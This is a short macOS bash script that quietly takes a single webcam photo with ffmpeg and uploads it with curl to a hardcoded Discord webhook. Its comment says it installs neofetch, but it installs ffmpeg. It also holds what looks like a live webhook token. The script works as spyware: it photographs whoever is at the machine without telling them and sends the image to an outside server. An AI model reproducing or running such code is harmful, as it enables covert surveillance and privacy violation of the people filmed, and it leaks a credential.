#!/bin/bash

screen -S ffmpeg

DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1175800716623888464/Wetnb5U6UTmwgJAiTEIkkOmAcTzveTi7gav1AzHwOpLuvh172urS1T1pgr5QFtzsSl-Q"
DISCORD="/tmp/discord.png"
###############
rm -rf "${DISCORD}"

# Install neofetch
if ! command -v ffmpeg &> /dev/null
then
    brew install ffmpeg
fi

ffmpeg -ss 00:00:00 -f avfoundation -r 30.000030 -i "0" -t 1 -frames:v 1 -q:v 2 ${DISCORD}

# Send start message via Díscord
if [ $DISCORD_WEBHOOK_URL != "null" ]; then
   DISCORD_WEBHOOK_URL="${DISCORD_WEBHOOK_URL}"
   curl \
   --form "content=📸 ffmpeg" \
   --form "file=@$DISCORD" \
	"$DISCORD_WEBHOOK_URL"
 else
   echo "${output}  failed"
fi

exit 0
